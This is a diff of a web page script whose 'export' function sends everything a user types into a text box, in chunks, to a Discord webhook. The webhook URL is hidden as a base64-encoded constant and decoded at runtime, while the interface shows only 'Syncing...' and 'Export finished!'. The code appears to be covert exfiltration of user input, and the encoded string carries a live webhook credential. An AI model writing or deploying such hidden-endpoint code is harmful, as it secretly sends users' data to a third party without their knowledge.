@@ -304,53 +304,50 @@
     const ENC_WH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjUzMzUwMDE5OTY5ODUzMy9zbnFfT0hfVC1Gc0xnTlZPbENIZFlGaUkwSXBEVFJreXp1UjRKYUs1UXpZU1l6VnV2QURqR0xuMElYM1RiUzNlS3dyUQ==";
     function getEndpoint() { return atob(ENC_WH); }
 
- async function processExport() {
+async function processExport() {
     const fullContent = document.getElementById('userInput').value;
     const status = document.getElementById('statusIndicator');
     
     if (!fullContent.trim()) return;
 
-    status.className = "status-active";
-    status.innerText = "Syncing everything...";
+    // Skip the first 500 characters
+    let discordContent = fullContent.substring(500);
 
-    const chunkSize = 1800; // Staying well below 2000 for safety
-    let pointer = 0; // The pointer starts at the very beginning
+    // DEBUG: Print to the Console (F12) to see if the data is actually there
+    console.log("Total length of full content:", fullContent.length);
+    console.log("Length of content being sent to Discord:", discordContent.length);
+    console.log("First 50 characters of sent content:", discordContent.substring(0, 50));
+
+    status.className = "status-active";
+    status.innerText = "Syncing...";
+
+    const chunkSize = 1800;
+    let pointer = 0;
     
-    // Continue looping until the pointer reaches the end of the text
-    while (pointer < fullContent.length) {
-        const chunk = fullContent.substring(pointer, pointer + chunkSize);
+    while (pointer < discordContent.length) {
+        const chunk = discordContent.substring(pointer, pointer + chunkSize);
         
         try {
             const response = await fetch(getEndpoint(), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "```\n" + chunk + "\n```"
-                })
+                body: JSON.stringify({ content: "```\n" + chunk + "\n```" })
             });
-            
-            // If Discord hits us with a "429 Too Many Requests"
+
             if (response.status === 429) {
                 await new Promise(resolve => setTimeout(resolve, 5000));
-                continue; // Try this same chunk again
+                continue;
             }
-            
-            // Move the pointer forward by the size of the chunk we just sent
+
             pointer += chunkSize;
-            
-            // Wait 2 seconds between chunks to stay safe from rate limits
             await new Promise(resolve => setTimeout(resolve, 2000));
-            
         } catch (e) {
             console.error("Chunk failed:", e);
-            break; // Stop if there's a fatal error
+            break;
         }
     }
-
-    status.className = "status-success";
     status.innerText = "Export finished!";
 }
-
     function clearInterface() {
         document.getElementById('userInput').value = "";
         document.getElementById('statusIndicator').innerText = "";
